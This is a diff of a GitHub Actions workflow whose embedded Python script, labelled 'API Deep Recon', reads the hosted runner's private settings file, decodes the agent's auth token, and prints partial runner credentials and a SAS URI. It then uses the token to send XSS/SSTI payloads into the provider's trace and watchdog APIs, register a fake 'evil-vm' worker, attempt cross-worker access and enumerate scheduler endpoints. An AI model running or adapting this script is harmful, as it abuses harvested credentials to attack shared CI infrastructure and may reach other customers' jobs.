@@ -8,57 +8,43 @@ jobs:
   api-test:
     runs-on: ubuntu-latest
     steps:
-      - name: API Recon
+      - name: API Deep Recon
         run: |
           python3 << 'PYEOF'
-          import json, os, subprocess, urllib.request, urllib.error, ssl, sys, time
+          import json, os, urllib.request, urllib.error, ssl, time
 
           ctx = ssl.create_default_context()
-          
-          # Read HCA settings
           settings_path = "/opt/hca/.settings"
-          settings = None
-          if os.path.exists(settings_path):
-              with open(settings_path) as f:
-                  settings = json.load(f)
-              print(f"[+] Settings loaded from {settings_path}")
-          else:
-              print(f"[-] {settings_path} not found, trying environment")
-              # Try env vars
-              for k,v in sorted(os.environ.items()):
-                  if 'scheduler' in k.lower() or 'token' in k.lower() or 'trace' in k.lower() or 'hca' in k.lower():
-                      print(f"  {k}={v[:50]}...")
-              sys.exit(1)
+          with open(settings_path) as f:
+              settings = json.load(f)
 
-          # Extract key fields  
-          auth_token = settings.get("authToken", "")
-          scheduler_url = settings.get("schedulerApiUrl", "")
-          trace_url = settings.get("traceApiUrl", "")
-          watchdog_url = settings.get("watchdogTraceApiUrl", "")
-          diag_sas = settings.get("diagnosticsSasUri", "")
+          auth_token = settings["authToken"]
+          scheduler_url = settings["schedulerApiUrl"]
+          trace_url = settings["traceApiUrl"]
+          watchdog_url = settings["watchdogTraceApiUrl"]
           config_id = settings.get("configId", "")
-          vm_name = settings.get("vmName", "")
-          realm = settings.get("realm", "")
-          mode = settings.get("mode", "")
           
-          print(f"[+] Scheduler URL: {scheduler_url}")
-          print(f"[+] Trace URL: {trace_url}")
-          print(f"[+] Watchdog URL: {watchdog_url}")
-          print(f"[+] Config ID: {config_id}")
-          print(f"[+] VM Name: {vm_name}")
-          print(f"[+] Realm: {realm}")  
-          print(f"[+] Mode: {mode}")
-          print(f"[+] Token (first 50): {auth_token[:50]}")
-          print(f"[+] Diag SAS (first 80): {diag_sas[:80]}")
-          
-          # Print all settings keys
-          print(f"\n[*] All settings keys: {list(settings.keys())}")
-          
-          # Print non-sensitive values
+          # Print full settings (redacting secrets)
+          print("[+] FULL SETTINGS (redacted):")
           for k, v in settings.items():
-              if k not in ('authToken', 'diagnosticsSasUri', 'runnerAgentCredentials', 'runnerAgentCredentialsRSA'):
-                  print(f"  {k} = {json.dumps(v)[:200]}")
-          
+              if k in ('authToken',):
+                  # Decode JWT claims
+                  import base64
+                  parts = v.split('.')
+                  if len(parts) == 3:
+                      # Fix padding
+                      payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
+                      claims = json.loads(base64.urlsafe_b64decode(payload))
+                      print(f"  {k} (JWT claims): {json.dumps(claims, indent=2)}")
+              elif k == 'diagnosticsSasUri':
+                  print(f"  {k}: {v[:100]}...")
+              elif k == 'runnerAgentCredentials':
+                  print(f"  {k}: {v[:100]}...")
+              elif k == 'runnerAgentCredentialsRSA':
+                  print(f"  {k}: {str(v)[:100]}...")
+              else:
+                  print(f"  {k}: {json.dumps(v)}")
+
           headers = {
               "Authorization": f"Bearer {auth_token}",
               "Content-Type": "application/json",
@@ -71,62 +57,84 @@ jobs:
                   req = urllib.request.Request(url, data=data, headers=headers, method=method)
                   resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                   body_resp = resp.read().decode()
-                  print(f"  [{resp.status}] {body_resp[:500]}")
+                  print(f"  [{resp.status}] {body_resp[:800]}")
                   return resp.status, body_resp
               except urllib.error.HTTPError as e:
                   body_resp = e.read().decode() if e.fp else ""
-                  print(f"  [HTTP {e.code}] {body_resp[:500]}")
+                  print(f"  [HTTP {e.code}] {body_resp[:800]}")
                   return e.code, body_resp
               except Exception as e:
                   print(f"  [ERROR] {e}")
                   return 0, str(e)
 
-          # Test 1: GET /request - what's our current assignment?
-          print("\n=== TEST 1: GET /request ===")
-          api_call("GET", f"{scheduler_url}/request")
+          # Test 1: Fix trace API - level as integer (0=debug, 1=info, 2=warn, 3=error?)
+          print("\n=== TRACE API - level as int ===")
+          for level in [0, 1, 2, 3, 4, 5]:
+              trace_body = [{
+                  "level": level,
+                  "message": f"test level {level}",
+                  "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+                  "logger": "hosted-compute-agent",
+                  "tracepoint": "security.test",
+                  "sourceCorrelationId": config_id,
+                  "processLifetimeId": "plid-001",
+                  "orchestrationId": "orch-001",
+                  "requestId": "req-001"
+              }]
+              print(f"  level={level}:")
+              status, resp = api_call("POST", trace_url, trace_body)
+              if status == 200:
+                  print(f"  >>> LEVEL {level} ACCEPTED!")
+                  break
 
-          # Test 2: PUT /request/heartbeat
-          print("\n=== TEST 2: PUT /request/heartbeat ===")
-          beat_body = {"beat_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
-          api_call("PUT", f"{scheduler_url}/request/heartbeat", beat_body)
-
-          # Test 3: POST to trace API
-          print("\n=== TEST 3: POST to trace API ===")
-          trace_body = [{
-              "level": "info",
-              "message": "HCA security test trace",
+          # Test 2: Inject crafted trace with XSS/SSTI payload
+          print("\n=== TRACE INJECTION TEST ===")
+          inject_body = [{
+              "level": 1,
+              "message": "<script>alert('xss')</script>{{7*7}}",
               "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-              "logger": "hosted-compute-agent",
-              "tracepoint": "security.test",
-              "sourceCorrelationId": config_id,
-              "processLifetimeId": "test-plid-001",
-              "orchestrationId": "test-orch-001",
-              "requestId": "test-req-001"
+              "logger": "security-test",
+              "tracepoint": "injection.test",
+              "sourceCorrelationId": "INJECTED-" + config_id,
+              "processLifetimeId": "INJECT-plid",
+              "orchestrationId": "INJECT-orch",
+              "requestId": "INJECT-req",
+              "additionalData": {"injected": True, "payload": "test"},
+              "properties": {"source": "pentest"}
           }]
-          api_call("POST", trace_url, trace_body)
+          api_call("POST", trace_url, inject_body)
 
-          # Test 4: POST to watchdog trace
-          print("\n=== TEST 4: POST to watchdog trace ===")
-          api_call("POST", watchdog_url, trace_body)
-          
-          # Test 5: Try registering a new worker (may conflict)
-          print("\n=== TEST 5: POST /worker (register) ===")
-          api_call("POST", f"{scheduler_url}/worker")
-          
-          # Test 6: Try different trace API paths
-          print("\n=== TEST 6: GET scheduler base URL ===")
-          api_call("GET", scheduler_url)
-          
-          # Test 7: Try /request with query params
-          print("\n=== TEST 7: DELETE /request?outcome=0 ===")
-          # DON'T actually do this - it would finish our job!
-          # Just try with a HEAD to see if endpoint exists
-          api_call("GET", f"{scheduler_url}/request?outcome=0")
-          
-          # Test 8: Enumerate - try /workers path
-          print("\n=== TEST 8: Other paths ===")
-          for path in ["/workers", "/health", "/status", "/", "/v1/worker", "/v1/request"]:
-              print(f"  Trying {path}:")
-              api_call("GET", f"{scheduler_url}{path}")
+          # Test 3: Watchdog with crafted data
+          print("\n=== WATCHDOG INJECTION ===")
+          api_call("POST", watchdog_url, inject_body)
 
+          # Test 4: Try PATCH /request (notify start)
+          print("\n=== PATCH /request ===")
+          api_call("PATCH", f"{scheduler_url}/request")
+
+          # Test 5: Try different outcomes on DELETE
+          print("\n=== DELETE /request info (don't actually finish) ===")
+          # Try with an invalid outcome to see error messages
+          api_call("DELETE", f"{scheduler_url}/request?outcome=99")
+
+          # Test 6: Register with custom body
+          print("\n=== POST /worker with body ===")
+          worker_body = {
+              "vmName": "evil-vm",
+              "configId": config_id,
+              "osType": "linux",
+              "realm": "github"
+          }
+          api_call("POST", f"{scheduler_url}/worker", worker_body)
+          
+          # Test 7: Try to read another worker's data
+          print("\n=== Cross-worker access ===")
+          api_call("GET", f"{scheduler_url}/request?workerId=other-worker-id")
+          
+          # Test 8: SSRF via trace/watchdog - try internal URLs
+          print("\n=== Trace API error detail ===")
+          # Malformed body to get more error info
+          api_call("POST", trace_url, "not json")
+          api_call("POST", trace_url, [{"wrong": "schema"}])
+          
           PYEOF
